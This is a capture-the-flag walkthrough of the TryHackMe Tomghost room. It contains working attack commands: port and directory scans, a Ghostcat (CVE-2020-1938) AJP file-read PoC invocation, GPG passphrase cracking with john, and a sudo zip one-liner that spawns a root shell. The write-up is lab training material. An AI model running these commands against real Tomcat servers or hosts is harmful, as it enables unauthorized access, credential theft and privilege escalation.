---
description: >-
  Recon → Ghostcat file read via AJP → SSH foothold → GPG pivot → sudo zip to
  root.
metaLinks:
  alternates:
    - https://app.gitbook.com/s/JbMs2bD1gcL5F6LMRlXh/
---

# Tomghost — Ghostcat (CVE-2020-1938) Walkthrough

### Scope

Target: `10.65.179.38`&#x20;

Author: Oussama Zehri

Machine link :[https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)

Goal: get an initial shell, pivot if needed, then escalate to `root`.

{% hint style="warning" %}
Use these steps only in authorized labs (TryHackMe/HTB/etc).
{% endhint %}

***

### Recon

Run a full port and service scan:

```bash
nmap -sC -sV -p- 10.65.179.38
```

Key findings from the scan:

* `22/tcp` SSH (OpenSSH 7.2p2 Ubuntu)
* `8009/tcp` AJP/1.3 (Tomcat connector)
* `8080/tcp` HTTP (Apache Tomcat **9.0.30**)

That combo (`8080` + `8009`) is a strong Ghostcat signal.

***

### Web enumeration (8080)

Directory brute force:

```bash
gobuster dir -u http://10.65.179.38:8080/ -w /usr/share/wordlists/dirb/common.txt
```

Interesting endpoint:

* `/manager` (Tomcat Manager)

If you can access the manager page, keep any discovered creds handy. Even if they don’t work there, they often work for SSH.

***

### Vulnerability: Ghostcat (CVE-2020-1938)

Tomcat 9.0.30 is in the vulnerable range for Ghostcat.

The bug sits in AJP (port `8009`). In the common misconfig case, it can allow unauthenticated file reads.

Typical high-value target:

* `WEB-INF/web.xml` (often contains app usernames/passwords or secrets)

{% hint style="info" %}
Ghostcat is primarily **file read / file include**. It can become RCE if you can get a server-side file written and executed.
{% endhint %}

***

### Foothold: read `web.xml` via AJP (8009)

Grab a public PoC (one common Searchsploit entry is `48143.py`), then read `web.xml`:

```bash
# Example syntax used by common Ghostcat PoCs
python2 48143.py -p 8009 -f WEB-INF/web.xml 10.65.179.38
```

From the output, extract credentials you can reuse (often basic-auth style or app creds).

Then try SSH with the discovered username/password:

```bash
ssh <user>@10.65.179.38
```

At this point you should have initial access.

***

### Post-exploitation: pivot material (GPG + key)

If you don’t see the expected flags in the first home directory, enumerate for “interesting” files:

```bash
ls -la
find /home -maxdepth 3 -type f -iname "*.asc" -o -iname "*.pgp" 2>/dev/null
```

In this box, you typically find:

* `tryhackme.asc` (an exported private key)
* `credential.pgp` (an encrypted blob)

#### Crack the key passphrase (John)

Convert and crack:

```bash
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

#### Import the key and decrypt the PGP

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

You should get credentials for another user (commonly `merlin:<password>`).

Switch user:

```bash
su - merlin
```

***

### Privilege escalation: `zip` via sudo (GTFOBins)

Check sudo rights:

```bash
sudo -l
```

If `zip` is allowed as root, you can pop a root shell using the GTFOBins technique:

```bash
sudo zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
```

Validate:

```bash
id
whoami
root
```

***

### Notes / troubleshooting

* If the Ghostcat PoC returns nothing, verify:
  * port `8009` is reachable from your host
  * the AJP connector isn’t protected with `secretRequired="true"`
* If `/manager` prompts for auth, don’t brute force it blindly. Extract creds from `web.xml` first.
* If `su` is blocked, try SSHing directly as the second user.
